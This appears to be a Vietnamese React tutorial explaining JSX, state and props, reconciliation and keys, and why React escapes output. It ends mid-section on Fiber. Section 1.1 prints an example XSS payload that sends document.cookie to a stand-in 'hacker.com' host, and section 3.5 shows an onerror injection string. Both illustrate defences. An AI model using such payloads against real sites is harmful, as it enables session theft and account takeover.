# React Base — Từ Bản Chất Đến Thực Hành

> Tài liệu này được viết lại với mục tiêu: người mới học React không chỉ biết "gõ code chạy được", mà hiểu **vì sao** React được thiết kế như vậy, và có thể tự kiểm chứng bằng tool thật thay vì học vẹt lý thuyết.

---

<!-- content-id: javascript-foundations -->
## 0. JavaScript Nền Tảng Cho React

React không thay thế JavaScript. Phần này là bộ công cụ tối thiểu để bạn dự đoán được code React trước khi chạy nó.

<!-- content-id: render-snapshot -->
### 0.1. Binding, scope và snapshot của một lần render

Mỗi lần React gọi function component, biến cục bộ được tạo cho **lần gọi đó**. `count` trong lần render có giá trị `0` không tự biến thành `1` chỉ vì bạn đã gọi `setCount(1)`; React sẽ tạo một lần gọi component sau với binding mới.

```jsx
function Counter() {
  const [count, setCount] = useState(0);

  function handleClick() {
    console.log(count); // snapshot của render đang hiển thị
    setCount(count + 1);
    console.log(count); // vẫn là snapshot cũ
  }

  return <button onClick={handleClick}>{count}</button>;
}
```

Hãy đọc handler như một “bức ảnh chụp” của props và state lúc nó được tạo. Đây là nền để hiểu batching, stale closure và dependency.

<!-- content-id: closure-identity -->
### 0.2. Closure và identity

**Closure** là việc một hàm giữ quyền đọc các biến trong scope nơi nó được tạo. Nó không phải bug. Bug chỉ xuất hiện khi một callback cũ cần dữ liệu mới nhưng bạn không tạo lại callback hoặc không dùng cách đọc dữ liệu mới nhất.

```javascript
const first = { name: 'Lan' };
const second = { name: 'Lan' };
console.log(first === second); // false: hai object khác identity

const same = first;
console.log(first === same); // true: cùng một object
```

Object, array và function tạo trong render thường có identity mới. React dùng các phép so sánh identity này cho dependency array, `memo`, `useMemo` và `useCallback`. Đừng tối ưu chỉ vì identity đổi: trước hết hãy đo hoặc chứng minh rằng lần render/tính toán đó thật sự đáng kể.

<!-- content-id: async-order -->
### 0.3. Promise, event loop và request race

`await` không khóa trang; phần sau `await` sẽ chạy sau khi Promise hoàn thành. Hai request bắt đầu theo thứ tự A rồi B có thể hoàn thành theo thứ tự B rồi A. Vì vậy UI không nên giả định “request bắt đầu sau sẽ luôn về sau”.

```javascript
const a = fetch('/api/users/1');
const b = fetch('/api/users/2');
// b có thể resolve trước a.
```

Với UI, hãy dùng một trong các chiến lược rõ ràng: `AbortController`, request ID, cache theo key, hoặc bỏ qua kết quả khi nó không còn đại diện cho màn hình hiện tại.

<!-- content-id: immutable-update -->
### 0.4. Immutable update và giá trị suy ra

Không sửa trực tiếp object/array đang nằm trong state. Hãy tạo giá trị mới cho phần đổi để dữ liệu cũ vẫn có ý nghĩa và React có thể so sánh identity.

```jsx
setTodos(previous =>
  previous.map(todo => todo.id === id ? { ...todo, done: !todo.done } : todo)
);
```

Nếu có thể tính một giá trị từ props/state trong lúc render, đừng lưu thêm một state thứ hai cho nó. Ví dụ, tiêu đề chương đang mở có thể suy ra từ `currentChapterId` và danh sách chương; lưu cả `chapterTitle` tạo hai nguồn sự thật có thể lệch nhau.

<!-- content-id: react-context -->
## 1. Bối Cảnh: Vì Sao React Ra Đời

### 1.1. Thời kỳ Server-Side Rendering thuần túy

Trước khi có các thư viện như React, cách phổ biến nhất để tạo trang web là: server nhận request, xử lý dữ liệu, rồi **ghép chuỗi** để tạo ra HTML gửi thẳng về trình duyệt. Ví dụ với PHP:

```php
<?php
$username = $_GET['name']; // dữ liệu từ người dùng
echo "<h1>Chào mừng, " . $username . "!</h1>";
?>
```

Cách này rất dễ tiếp cận — chỉ cần biết ghép chuỗi là làm được web. Nhưng nó mang theo một lỗ hổng bảo mật nghiêm trọng gọi là **XSS (Cross-Site Scripting)**.

**Ví dụ cụ thể:** nếu người dùng nhập vào ô "tên" (hoặc URL) đoạn:

```
<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>
```

thì HTML server trả về sẽ chứa nguyên văn đoạn script đó. Trình duyệt của **bất kỳ ai xem trang này** (ví dụ trang hồ sơ công khai, trang bình luận) sẽ tự động thực thi đoạn mã, gửi cookie đăng nhập của họ cho hacker — dẫn tới chiếm quyền tài khoản. Nguyên nhân gốc: **dữ liệu người dùng (chỉ nên là text) bị trộn lẫn với mã thực thi được (HTML/JS)** mà không qua bước làm sạch (sanitize/escape).

Giải pháp ban đầu là escape thủ công (biến `<` thành `&lt;`, `>` thành `&gt;`...), nhưng đây là việc dễ quên, dễ sai — một dòng code thiếu escape ở đâu đó trong hệ thống lớn là đủ để mở lỗ hổng.

#### Nhìn từng bước: dữ liệu biến thành mã thực thi như thế nào?

Điểm nguy hiểm không nằm ở PHP hay SSR. Lỗi xuất hiện khi ứng dụng đặt một giá trị **không đáng tin cậy** vào HTML mà không mã hóa đúng ngữ cảnh. Hãy lần theo đúng request `?name=...`:

1. Trình duyệt gửi giá trị `name` do người dùng kiểm soát lên server.
2. PHP nối thẳng giá trị đó vào chuỗi `<h1>Chào mừng, ...!</h1>`.
3. Server trả chuỗi kết quả với header `Content-Type: text/html`.
4. Trình duyệt **parse** chuỗi như HTML. Vì `<script>` hoặc một event handler được hiểu là mã, nó có thể chạy với quyền của chính website đang bị lỗi.

**Phân biệt hai tình huống thường gặp:** với reflected XSS, payload nằm trong URL và chạy khi nạn nhân mở chính đường link đã được tạo sẵn. Với stored XSS, payload được lưu vào database như một bình luận hoặc tên hồ sơ; khi đó bất kỳ ai mở trang chứa dữ liệu đã lưu đều có thể bị ảnh hưởng.

> Demo bên dưới dùng payload vô hại: nó chỉ đổi nội dung một ô trong trang để chứng minh JavaScript đã được trình duyệt diễn giải. Demo không đọc cookie, không gửi request và không thực thi nội dung tùy ý từ người học.

#### Sửa đúng ở phía PHP

Nếu dữ liệu chỉ cần xuất hiện như **text trong HTML**, hãy encode ngay tại output:

```php
<?php
$username = $_GET['name'] ?? '';
$safeUsername = htmlspecialchars(
    $username,
    ENT_QUOTES | ENT_SUBSTITUTE,
    'UTF-8'
);
echo "<h1>Chào mừng, " . $safeUsername . "!</h1>";
?>
```

Ví dụ `<script>` lúc này trở thành `&lt;script&gt;`. Trình duyệt hiển thị nó như chữ, thay vì tạo một phần tử script. Đây là **output encoding**, khác với sanitize: encoding dùng khi dữ liệu phải là text; sanitize chỉ cần khi sản phẩm thật sự cho phép người dùng nhập một tập HTML giới hạn.

Trong React, `{username}` cũng được escape mặc định. Tuy nhiên, lớp bảo vệ này bị bỏ qua nếu dùng `dangerouslySetInnerHTML`, thao tác `innerHTML` trực tiếp, hoặc đặt dữ liệu vào ngữ cảnh khác như URL mà không kiểm tra. Cookie `HttpOnly` và Content Security Policy là các lớp phòng thủ bổ sung; chúng giảm hậu quả nhưng không thay thế việc encode đúng đầu ra.

### 1.2. Vấn đề hiệu năng khi ứng dụng trở nên tương tác cao

Giả sử bạn có một danh sách chat 1000 tin nhắn. Có 1 tin nhắn mới đến, cách làm truyền thống (jQuery-style) thường là:

```javascript
function renderChat(messages) {
  let html = "<div class='chat'>";
  for (const msg of messages) {
    html += `<div class='message'>${escapeHtml(msg.text)}</div>`;
  }
  html += "</div>";
  document.getElementById("chat-box").innerHTML = html; // GHI ĐÈ TOÀN BỘ
}

messages.push(newMessage);
renderChat(messages); // render lại cả 1000 tin nhắn cũ + 1 tin mới
```

Vấn đề: dù chỉ có 1 phần tử mới, trình duyệt phải xóa sạch toàn bộ DOM cũ, dựng lại 1000 phần tử từ đầu, tính lại layout, vẽ lại (repaint) toàn màn hình. Với ứng dụng cập nhật liên tục (chat, dashboard theo dõi real-time, bảng giá chứng khoán...), việc này lặp lại hàng chục lần mỗi giây khiến trình duyệt ì ạch.

### 1.3. Vấn đề tổ chức mã nguồn: ràng buộc chồng chéo

Ngoài bảo mật và hiệu năng, cách quản lý dữ liệu-giao diện kiểu cũ (thao tác DOM trực tiếp, không có mô hình rõ ràng) khiến một thay đổi dữ liệu nhỏ có thể kéo theo hiệu ứng dây chuyền khó lường: bạn sửa một biến ở đâu đó, quên cập nhật một chỗ hiển thị liên quan, giao diện hiển thị sai mà không có lỗi nào báo ra — vì không có cơ chế nào đảm bảo "UI luôn khớp với data".

### 1.4. Giải pháp cốt lõi: mô phỏng giao diện trong bộ nhớ

React giúp tổ chức UI bằng cách mô tả giao diện từ dữ liệu, rồi React DOM điều phối việc cập nhật DOM. Virtual DOM/reconciliation là một phần của cách triển khai đó, không phải lời hứa rằng React luôn nhanh hơn DOM trực tiếp hay tự giải quyết XSS. JSX escape giá trị text theo mặc định; an toàn vẫn phụ thuộc vào ngữ cảnh đầu ra và việc không đưa dữ liệu chưa tin cậy vào API chèn HTML.

Ba động lực này — **bảo mật, hiệu năng, khả năng bảo trì** — chính là ba trụ cột giải thích cho gần như mọi quyết định thiết kế của React mà bạn sẽ thấy xuyên suốt tài liệu này.

---

<!-- content-id: react-design -->
## 2. Triết Lý Thiết Kế Của React

React không chỉ là một thư viện, nó là một **cách tư duy**. Ba trụ cột: Declarative Programming, Component-based Architecture, One-way Data Flow.

### 2.1. Lập trình khai báo (Declarative) vs lập trình chỉ thị (Imperative)

**Imperative — "làm sao" (HOW):** bạn ra lệnh từng bước cho trình duyệt.

```html
<div>
  <p id="count">0</p>
  <button id="btn">Increase</button>
</div>

<script>
  let count = 0;
  const countEl = document.getElementById("count");
  const btn = document.getElementById("btn");

  btn.addEventListener("click", () => {
    count++;                                              // 1. đổi data
    countEl.innerText = count;                             // 2. tự tay cập nhật text
    countEl.style.color = count % 2 === 0 ? "red" : "blue"; // 3. tự tay cập nhật màu
  });
</script>
```

Bạn phải nhớ: mỗi khi `count` đổi, phải tự đi cập nhật **từng chỗ** liên quan (text, màu...). Với 3 dòng thì không sao, nhưng với hàng trăm chỗ hiển thị liên quan đến `count` trên một trang phức tạp, việc "nhớ hết những nơi cần cập nhật" gần như bất khả thi — chỉ cần quên 1 chỗ là UI hiển thị sai mà không có gì báo lỗi.

**Declarative — "muốn cái gì" (WHAT):** bạn chỉ mô tả UI *phải trông như thế nào* ứng với một state, còn việc "làm sao để đạt được điều đó" là việc của React.

```jsx
import { useState } from "react";

function Counter() {
  const [count, setCount] = useState(0);

  return (
    <div>
      <p style={{ color: count % 2 === 0 ? "red" : "blue" }}>
        {count}
      </p>
      <button onClick={() => setCount(count + 1)}>
        Increase
      </button>
    </div>
  );
}

export default Counter;
```

Công thức cốt lõi: **`UI = f(state)`**. Bạn không viết "khi count đổi thì làm A, B, C" — bạn chỉ viết "với count này thì UI trông như vậy", và React tự đảm bảo đồng bộ. Đây là lý do bạn *không thấy* dòng nào kiểu `countEl.innerText = ...` trong code React — bởi vì bạn không cần viết nó, JSX ở dòng `<p>{count}</p>` **chính là** lời khai báo "UI phải hiển thị đúng giá trị count hiện tại", còn việc cập nhật DOM thật khi count đổi là trách nhiệm của React (thông qua Virtual DOM — phần 4).

> **Cách tự kiểm chứng:** mở 2 đoạn code trên trong 2 tab CodeSandbox/JSFiddle, đặt `console.log` ở mọi chỗ đổi DOM. Với bản imperative, bạn sẽ thấy chính tay mình gọi `countEl.innerText =` và `countEl.style.color =`. Với bản React, bạn sẽ không tìm thấy dòng nào tương tự trong code bạn viết — nhưng nếu mở DevTools tab Elements và click nút, bạn vẫn thấy DOM thay đổi. Đó là bằng chứng React đang tự làm phần "how" phía sau.

### 2.2. Kiến trúc dựa trên Component (Component-Based Architecture)

Tư duy đầu tiên khi xây UI bằng React là **phá vỡ giao diện tổng thể thành các mảnh nhỏ, độc lập, tái sử dụng được** — gọi là component. Thay vì viết một trang web nguyên khối, bạn xây từng mảnh: một nút bấm, một thanh điều hướng, một thẻ hồ sơ — rồi ghép lại.

**Nguyên tắc Single Responsibility cho component:** mỗi component chỉ nên làm một việc rõ ràng. Ví dụ, một component `UserProfile` đang phải xử lý cả việc fetch dữ liệu, hiển thị avatar, xử lý form đổi mật khẩu, và hiển thị danh sách bạn bè — đó là dấu hiệu cần tách thành 4 component nhỏ hơn: `useUserData` (logic), `Avatar`, `PasswordForm`, `FriendList`.

**React ưu tiên Composition hơn Inheritance.** Thay vì tạo cây phân cấp kế thừa phức tạp kiểu OOP (`class SpecialButton extends Button extends BaseComponent`), React khuyến khích bạn tạo các component đơn giản rồi **lồng ghép (compose)** chúng lại:

```jsx
// Thay vì kế thừa, ta "ghép" component qua children hoặc props
function Card({ children }) {
  return <div className="card">{children}</div>;
}

function UserCard({ user }) {
  return (
    <Card>
      <Avatar src={user.avatar} />
      <h3>{user.name}</h3>
    </Card>
  );
}
```

`UserCard` không "kế thừa" `Card` — nó chỉ dùng `Card` như một khối xây dựng, truyền nội dung riêng vào qua `children`. Cách này linh hoạt hơn nhiều: bạn có thể lồng bất kỳ nội dung nào vào `Card` mà không cần tạo lớp con mới.

### 2.3. State và Props — phân biệt rạch ròi

Đây là 2 khái niệm người mới hay nhầm lẫn nhất. Cách phân biệt nhanh: **state** là dữ liệu component *tự quản lý*, **props** là dữ liệu *được truyền từ ngoài vào*.

| Tiêu chí | State | Props |
|----------|-------|-------|
| Ai sở hữu | Component tự quản lý (nội bộ) | Được truyền từ component cha |
| Thay đổi được không | Có — qua `setState` / `useState` setter | Không — read-only, chỉ cha mới đổi được |
| Khi đổi thì sao | React lên lịch một lần render mới cho component sở hữu state | Cha render lại có thể khiến React gọi lại component con; điều đó khác với việc DOM chắc chắn đổi |
| Ví dụ điển hình | Nội dung ô input đang gõ, menu mở/đóng, tab đang chọn | `user`, `title`, `onClick`, `disabled` được cha truyền xuống |
| Ai chịu trách nhiệm khi cần đổi | Chính component đó | Component cha — con chỉ "xin" qua callback |

**Câu hỏi thực tế để phân biệt:** *"Dữ liệu này có thể bị thay đổi từ bên trong component này không?"*
- Có → **state** (`useState`)
- Không, chỉ do cha truyền vào → **props**

**Ví dụ:** ô tìm kiếm — text người dùng đang gõ là **state** (component tự quản lý khi người dùng nhập), còn `placeholder` hay `onSearch` là **props** (cha quyết định, con chỉ đọc và gọi lại).

```jsx
import { useState } from "react";

function Parent() {
  const [count, setCount] = useState(0); // Parent SỞ HỮU state này

  return (
    <div>
      <h2>Parent count: {count}</h2>
      <Child count={count} /> {/* truyền xuống qua props */}
      <button onClick={() => setCount(count + 1)}>Increase</button>
    </div>
  );
}

function Child({ count }) {
  // Không dùng props làm nơi lưu state: giá trị của `count` đến từ Parent.
  return <p>Child nhận props: {count}</p>;
}

export default Parent;
```

**Phân biệt ba việc rất dễ lẫn:** `count = count + 1` chỉ gán lại **binding JavaScript cục bộ** trong lần gọi hàm hiện tại; sửa `props.user.name` là thay đổi một object mà component khác sở hữu (và nên tránh); còn `setCount(...)` yêu cầu React cập nhật state. Chỉ cách cuối làm React lên lịch render mới. Props là đầu vào read-only theo thiết kế: hãy coi chúng là dữ liệu để đọc, không phải chỗ để cất hoặc sửa trạng thái.

Khi cha render lại, React có thể gọi lại `Child` ngay cả khi `count` có cùng giá trị. `React.memo` có thể bỏ qua lần gọi lại đó khi props không đổi theo phép so sánh nông, nhưng state hoặc context của chính `Child` vẫn có thể làm nó cập nhật. Và dù component được gọi lại, React chỉ thay đổi DOM ở commit nếu kết quả UI cần thay đổi.

### 2.4. Luồng dữ liệu một chiều (One-way Data Flow)

Nguyên tắc: **dữ liệu luôn chảy từ cha xuống con qua props.** Khi con cần "yêu cầu" thay đổi dữ liệu, nó không tự sửa — nó gọi một **callback function** mà cha truyền xuống, để cha là người quyết định cập nhật state.

```jsx
function Parent() {
  const [count, setCount] = useState(0);

  return (
    <div>
      <h1>Count: {count}</h1>
      <Child onIncrease={() => setCount(count + 1)} />
    </div>
  );
}

function Child({ onIncrease }) {
  // Child hoàn toàn không biết giá trị count là bao nhiêu,
  // nó chỉ biết "khi được click, gọi hàm onIncrease"
  return <button onClick={onIncrease}>Tăng</button>;
}
```

**Ví dụ minh họa "vì sao một chiều lại dễ debug hơn":** state vẫn có một chủ sở hữu là `Parent`. Con không nhận được state để tự sửa; nó phát ra một yêu cầu có tên theo nghiệp vụ (`onIncrease`), rồi `Parent` quyết định có gọi `setCount` hay không. Khi bug xảy ra, ta lần từ callback về nơi sở hữu state và lần giá trị mới lại đi xuống qua props. Đó là luồng một chiều; không phải quy tắc rằng chỉ một component duy nhất trong ứng dụng được gọi setter.

> **Bài tập tự kiểm chứng:** thử để `Child` nhận `setCount` và gọi `setCount(999)`. Cách này vẫn hợp lệ: state vẫn thuộc `Parent`, và giá trị mới vẫn đi xuống bằng props. Trong ứng dụng lớn, callback theo ý nghĩa nghiệp vụ (`onIncrease`, `onReset`) thường dễ tìm và dễ giới hạn quyền hơn setter tổng quát.
<!-- content-id: jsx-security -->
## 3. Bản Chất Của JSX Và Quá Trình Biên Dịch

### 3.1. Trình duyệt không hề biết JSX là gì

JSX (JavaScript XML) cho phép viết `<div>`, `<h1>` trực tiếp trong JavaScript, tạo cảm giác rất thân thiện với người mới. Nhưng cần hiểu rõ: **trình duyệt chỉ hiểu HTML, CSS, và JavaScript chuẩn — nó không biết JSX là gì.** JSX chỉ là "đường cú pháp" (syntactic sugar), bắt buộc phải qua một bước **biên dịch (transform)** để trở thành JS thuần trước khi chạy được.

**Cách tự kiểm chứng ngay lập tức:** mở DevTools Console trên bất kỳ trang thuần HTML nào (không có React), gõ:
```javascript
document.write("<h1>Hello</h1>");
```
→ chạy bình thường, vì đây là chuỗi HTML. Nhưng nếu gõ:
```javascript
const x = <h1>Hello</h1>;
```
→ báo `SyntaxError` ngay lập tức. Đây là bằng chứng trực tiếp rằng JS engine của trình duyệt (V8, SpiderMonkey...) không parse được cú pháp `<h1>` nằm giữa biểu thức JS — nó cần Babel dịch trước.

### 3.2. Công cụ biên dịch: Babel

Công cụ phổ biến nhất là **Babel**, qua plugin `@babel/plugin-transform-react-jsx`. Có 2 kiểu biên dịch, tương ứng với 2 giai đoạn lịch sử của React.

**Classic Runtime (React ≤ 16):** mọi JSX được dịch thành lời gọi `React.createElement()`.

```jsx
// Bạn viết:
const element = <h1 className="greeting">Hello, World!</h1>;
```
dịch thành:
```javascript
const element = React.createElement(
  'h1',                        // type: tên thẻ hoặc Component
  { className: 'greeting' },   // props
  'Hello, World!'              // children
);
```

Vì mọi JSX đều ngầm gọi `React.createElement`, nên ở phiên bản cũ **bắt buộc** phải có `import React from 'react';` ở đầu mỗi file — kể cả khi bạn không gõ chữ `React` ở bất kỳ đâu trong code. Lý do: dòng import đó không phải để bạn dùng, mà để biến `React` tồn tại trong scope cho đoạn code Babel *tự sinh ra* phía sau lưng bạn.

**Automatic Runtime (từ React 17):** Babel tự chèn import ẩn và gọi hàm `_jsx` thay vì `React.createElement`:

```javascript
// Babel tự thêm dòng này — bạn không cần viết
import { jsx as _jsx } from 'react/jsx-runtime';

function App() {
  return _jsx('h1', { children: 'Hello world' });
}
```

Đây là lý do các dự án React hiện đại (Next.js, Vite + React) không còn cần `import React` thủ công nữa.

### 3.3. Thực hành: tự xem quá trình biên dịch

Có 4 cách để "mắt thấy tay sờ" được quá trình này thay vì chỉ tin vào lý thuyết:

**Cách 1 — Babel REPL (nhanh nhất):** vào `babeljs.io/repl`, dán JSX vào ô trái. Ở sidebar, tick preset **react**, chọn **React Runtime: Classic** hoặc **Automatic** để so sánh 2 kiểu output ở trên.

**Cách 2 — Babel CLI trên máy thật:**
```bash
npm install --save-dev @babel/core @babel/cli @babel/preset-react
```
Tạo `.babelrc`:
```json
{ "presets": ["@babel/preset-react"] }
```
Chạy:
```bash
npx babel test.jsx --out-file test-compiled.js
```
Mở file `test-compiled.js` — đây chính xác là code trình duyệt thực sự nhận được.

**Cách 3 — DevTools Sources tab:** với project chạy bằng Vite/CRA, mở F12 → tab **Sources**, tìm file `.jsx` gốc (qua sourcemap) và toggle để xem bản đã biên dịch song song với bản gốc.

**Cách 4 — console.log trực tiếp object JSX:** đây là cách nhanh nhất để kiểm chứng phần 3.4 dưới đây.

### 3.4. JSX không tạo ra HTML — nó tạo ra một object JavaScript

Dù biên dịch kiểu nào, kết quả cuối cùng luôn chỉ là **một object JS thuần**, mô tả giao diện chứ không phải HTML thật:

```jsx
<h1>Hello</h1>
```
tương đương với object:
```javascript
{
  type: 'h1',
  props: {
    children: 'Hello'
  }
}
```

**Kiểm chứng ngay trong project React:**
```jsx
const element = <h1 className="greeting">Hello, World!</h1>;
console.log(element);
```
Mở Console, bạn sẽ thấy đúng object này hiện ra — không phải chuỗi HTML `"<h1 class=..."`, mà là object JS với `type`, `props`.

<!-- content-id: jsx-element-safety -->
### 3.5. React element, `$$typeof` và ranh giới an toàn

JSX tạo một object mô tả UI. Trong object này React có một giá trị `$$typeof` dùng để nhận diện **định dạng element** khi xử lý nội bộ:

```javascript
const element = <h1>Hello</h1>;

// Dạng đơn giản hóa; đừng phụ thuộc vào cấu trúc implementation này.
{
  $$typeof: Symbol.for('react.element'),
  type: 'h1',
  props: { children: 'Hello' }
}
```

`$$typeof` không phải chữ ký xác nhận element “đến từ React” và không phải cơ chế bảo mật. JSON thông thường không mang được Symbol thật, nhưng mã JavaScript trong cùng môi trường vẫn có thể gọi `Symbol.for` với cùng khóa. Vì vậy, không dùng chi tiết này để quyết định dữ liệu nào đáng tin.

Ba trường hợp người mới cần phân biệt là:

| Giá trị đặt trong JSX | React xử lý như thế nào | Cách dùng đúng |
|---|---|---|
| Chuỗi hoặc số | Hiển thị thành text | `<p>{user.name}</p>` |
| React element hợp lệ | Mô tả một phần UI | `<Card />` hoặc `<div />` |
| Plain object dữ liệu | Thường gây lỗi nếu đặt trực tiếp làm child | Chọn trường cần hiển thị: `{user.name}` |

#### `$$typeof` không thay thế phòng chống XSS

React escape giá trị text trong JSX theo mặc định:

```jsx
const userInput = "<img src=x onerror=alert(1)>";
return <div>{userInput}</div>; // hiển thị text, không biến nó thành HTML
```

Lớp bảo vệ này không áp dụng nếu dữ liệu chưa tin cậy được đưa vào `dangerouslySetInnerHTML`, `innerHTML`, URL hoặc API DOM khác có ngữ cảnh riêng. `dangerouslySetInnerHTML` chỉ dành cho markup mà sản phẩm thực sự cần hiển thị. Khi dùng nó, hãy sanitize theo đúng ngữ cảnh, giữ thư viện/cấu hình cập nhật và bổ sung CSP; không có một lời hứa “an toàn 100%” chỉ từ một hàm sanitize.

```jsx
import DOMPurify from 'dompurify';

function RichText({ html }) {
  const safeHtml = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: safeHtml }} />;
}
```

---

<!-- content-id: render-commit -->
## 4. Công Nghệ Điều Phối Hiệu Năng: Virtual DOM và Reconciliation

### 4.1. Vì sao thao tác trực tiếp lên Real DOM lại đắt đỏ

Thao tác DOM có thể kéo theo các loại công việc khác nhau: tính style, layout, paint và composite. Đổi `color` thường cần paint nhưng không nhất thiết layout; thêm node có thể ảnh hưởng vị trí các node khác. Đây là những công việc tốn tài nguyên thực sự, nhưng phải đo trong ngữ cảnh CSS và trình duyệt cụ thể.

**Cách đo đúng:** tạo tình huống cụ thể, mở DevTools Performance, ghi thao tác và kiểm tra các mục Style/Layout/Paint. `performance.now()` quanh một vòng gán style chưa bao gồm đầy đủ phần vẽ có thể bị trình duyệt hoãn; khi báo kết quả hãy ghi máy, dữ liệu, thao tác và metric.

### 4.2. Cơ chế Virtual DOM — 4 giai đoạn

Virtual DOM (VDOM) là một cây object JS mô phỏng lại cấu trúc DOM thật, tồn tại hoàn toàn **trong bộ nhớ JavaScript** (không chạm trình duyệt). Quá trình đồng bộ, gọi là **Reconciliation**, gồm 4 bước:

1. **Render đầu tiên:** React tính UI ban đầu rồi commit các host node cần thiết. Trình duyệt sau đó thực hiện công việc style, layout, paint và composite khi cần; không nên gộp tất cả thành một khái niệm "vẽ".
2. **Trigger & re-render:** khi state đổi, React có thể gọi lại component chứa state để tính UI kế tiếp. Đây là pha render, chưa phải bằng chứng DOM đã đổi.
3. **Reconciliation:** React đối chiếu mô tả UI mới với mô tả trước đó theo các quy tắc nhận diện của nó.
4. **Commit:** React áp các thay đổi cần thiết lên renderer (với React DOM là DOM). Sau đó trình duyệt quyết định phần style/layout/paint nào cần làm. React cố giảm thay đổi thừa nhưng không hứa mọi cập nhật luôn là "patch tối thiểu".

**Ví dụ cụ thể để thấy sự khác biệt:** giả sử bạn có danh sách 1000 tin nhắn (giống ví dụ ở phần 1.2), và chỉ 1 tin nhắn mới được thêm vào cuối mảng `messages`. Với React:

```jsx
function ChatList({ messages }) {
  return (
    <div>
      {messages.map(msg => <div key={msg.id}>{msg.text}</div>)}
    </div>
  );
}
```

Khi `messages` có thêm 1 phần tử, component có thể chạy lại và React nhận diện phần tử mới ở cuối nhờ key ổn định. Trong trường hợp đơn giản này, commit thường chỉ cần chèn node mới. Tuy nhiên số DOM mutation và phần việc layout/paint phụ thuộc vào CSS, cấu trúc và trình duyệt; đừng suy ra "không reflow/repaint" chỉ từ việc 1 item được thêm.

<!-- content-id: reconciliation-identity -->
### 4.3. Reconciliation: heuristic nhận diện theo type và key

####  Tại sao không so sánh cây tổng quát?

So sánh cây tổng quát tối ưu là bài toán đắt hơn nhiều so với cách một UI framework thường cần xử lý. Tài liệu reconciliation lịch sử của React mô tả một heuristic có độ phức tạp gần tuyến tính theo số phần tử trong mô hình đó.

React chọn hướng thực dụng: dùng các quy tắc nhận diện như type và key. Đây không phải cam kết thời gian chạy tổng thể của mọi ứng dụng: chính code trong component vẫn có thể tốn kém.

---

####  Giả định 1 — Khác `type` = khác hoàn toàn cây con

Nếu node gốc đổi loại (`div` → `span`, `div` → `MyComponent`...), React **không cố so sánh bên trong** mà hủy toàn bộ subtree cũ và dựng mới.

```jsx
// Render lần 1:
<div>
  <Counter />   {/* Counter có state: count = 5 */}
</div>

// Render lần 2 — chỉ đổi div → span:
<span>
  <Counter />
</span>
```

**Điều xảy ra:**

```
Cây cũ            Cây mới           Hành động của React
─────────         ─────────         ──────────────────────────────
div               span               type khác → HỦY toàn bộ subtree cũ
└─ Counter        └─ Counter          Counter mất luôn state (count = 0 lại)
   count=5           count=0          Dựng subtree mới hoàn toàn
```

> **Hệ quả thực tế:** đổi loại phần tử bao ngoài là thao tác "đắt" — mọi state của component con đều bị reset. Tránh đổi `type` ở cấp trên nếu muốn giữ state bên trong.

---

####  Giả định 2 — `key` trong danh sách để nhận diện danh tính

Khi render danh sách, React cần biết "phần tử nào là phần tử nào" sau mỗi lần cập nhật. `key` chính là "chứng minh thư" để React nhận diện — không có key ổn định, React chỉ còn biết dựa vào **vị trí** (index), và đó là nguồn gốc của lỗi.

```jsx
// KHÔNG NÊN — dùng index làm key
{items.map((item, index) => <Item key={index} data={item} />)}

// NÊN — dùng id ổn định
{items.map(item => <Item key={item.id} data={item} />)}
```

---

**Tình huống cụ thể: ứng dụng danh sách công việc, mỗi task có ô input ghi chú riêng**

Giả sử bạn có 3 task, mỗi task là một component có ô `<input>` — người dùng đã gõ ghi chú vào từng ô:

```
Danh sách ban đầu (key=index):

  [key=0]  Task A  | input: "ghi chú cho A"   ← người dùng đã gõ
  [key=1]  Task B  | input: "ghi chú cho B"
  [key=2]  Task C  | input: "ghi chú cho C"
```

Bây giờ người dùng **xóa Task A**. Array còn `[B, C]`. React render lại:

```
Danh sách sau xóa (key=index):

  [key=0]  Task B  | input: ???
  [key=1]  Task C  | input: ???
```

React nhìn vào key: `key=0` vẫn tồn tại → nó nghĩ đây vẫn là **cùng một component cũ** (component của Task A trước đó), chỉ là `data` prop thay đổi sang Task B. Vì vậy React **không unmount/remount** component, chỉ cập nhật prop. Kết quả: DOM node cũ của Task A — bao gồm cả state ô input — được **tái sử dụng** cho Task B.

```
Điều người dùng thấy:

  [key=0]  Task B  | input: "ghi chú cho A"   ← SAI! Ghi chú của A dính vào B
  [key=1]  Task C  | input: "ghi chú cho B"   ← SAI! Ghi chú của B dính vào C
```

UI trông vẫn "đúng" về nội dung task (tên task hiển thị đúng B và C), nhưng **state nội bộ của ô input bị trượt sang** — lỗi rất khó phát hiện trong code review vì không có gì "trông sai" trên màn hình ở cái nhìn đầu tiên.

---

**Dùng `key={item.id}` — React nhận diện chính xác:**

```
Danh sách ban đầu (key=id):

  [key="id-a"]  Task A  | input: "ghi chú cho A"
  [key="id-b"]  Task B  | input: "ghi chú cho B"
  [key="id-c"]  Task C  | input: "ghi chú cho C"
```

Sau khi xóa Task A, array còn `[B, C]`:

```
Danh sách sau xóa (key=id):

  [key="id-b"]  Task B  | input: "ghi chú cho B"   ← giữ nguyên state
  [key="id-c"]  Task C  | input: "ghi chú cho C"   ← giữ nguyên state
```

React thấy `key="id-a"` biến mất → **unmount đúng component của A**. `key="id-b"` và `key="id-c"` vẫn còn → B và C được giữ nguyên hoàn toàn, state ô input không hề bị đụng tới.

---

**Quy tắc chọn key:**

| Tình huống | Nên dùng | Lý do |
|------------|----------|-------|
| Data từ server (users, posts, tasks...) | `item.id` từ database | Id ổn định, duy nhất, không đổi theo vị trí |
| Danh sách tĩnh không bao giờ reorder/xóa/thêm | `index` tạm chấp nhận | Vị trí không thay đổi nên không gây lỗi |
| Danh sách có thể reorder, xóa, thêm | `item.id` hoặc tạo id bằng `crypto.randomUUID()` | Index trượt → lỗi state như trên |
| Không bao giờ | Giá trị ngẫu nhiên mỗi render (`Math.random()`) | Key đổi mỗi lần → React unmount/remount toàn bộ, mất state và hiệu năng tệ hơn cả không có key |

---

####  Tóm tắt 2 heuristic

```
Heuristic              Quy tắc                        Hệ quả nếu vi phạm
─────────────────────────────────────────────────────────────────────────
Khác type →            Hủy toàn bộ cây con cũ,        State component con
khác hoàn toàn         dựng cây mới                   bị reset bất ngờ

key trong danh sách    Nhận diện danh tính qua key,   State "dính" sai item,
→ nhận diện chính xác  không qua vị trí               lỗi âm thầm khó debug
```

---

### 4.4. Từ Stack Reconciler đến React Fiber

####  Vấn đề của Stack Reconciler (trước React 16)

Stack Reconciler duyệt cây VDOM bằng **đệ quy thuần túy** — dựa hoàn toàn vào call stack của JavaScript:

```
render(App)
  └─ render(Header)
